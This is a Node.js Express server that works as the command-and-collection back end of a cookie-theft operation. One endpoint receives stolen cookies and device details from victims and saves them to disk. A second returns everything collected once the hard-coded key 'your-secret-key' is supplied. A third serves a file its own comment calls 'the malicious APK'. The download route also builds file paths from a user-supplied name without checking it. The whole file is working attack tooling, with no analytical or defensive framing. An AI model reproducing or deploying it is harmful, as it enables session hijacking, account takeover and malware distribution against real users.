const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Configure multer for file uploads
const upload = multer({ dest: 'uploads/' });

// Endpoint to receive cookie data
app.post('/api/cookies', (req, res) => {
  try {
    const { cookies, deviceInfo, appType } = req.body;
    
    // Save cookies to file
    const timestamp = new Date().toISOString();
    const data = {
      timestamp,
      cookies,
      deviceInfo,
      appType
    };
    
    // Save to JSON file
    fs.writeFileSync(
      path.join(__dirname, `cookies_${Date.now()}.json`),
      JSON.stringify(data, null, 2)
    );
    
    console.log(`Received cookies from ${deviceInfo?.model || 'unknown device'}`);
    
    res.status(200).json({ success: true, message: 'Data received' });
  } catch (error) {
    console.error('Error processing cookies:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Endpoint to retrieve collected cookies
app.get('/api/retrieve/:key', (req, res) => {
  const { key } = req.params;
  
  // Simple key authentication
  if (key !== 'your-secret-key') {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  
  try {
    const files = fs.readdirSync(__dirname)
      .filter(file => file.startsWith('cookies_') && file.endsWith('.json'));
    
    const cookies = files.map(file => {
      const data = fs.readFileSync(path.join(__dirname, file), 'utf8');
      return JSON.parse(data);
    });
    
    res.status(200).json({ success: true, cookies });
  } catch (error) {
    console.error('Error retrieving cookies:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Endpoint to serve the malicious APK
app.get('/download/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join(__dirname, 'apks', filename);
  
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ success: false, message: 'File not found' });
  }
});

module.exports = app;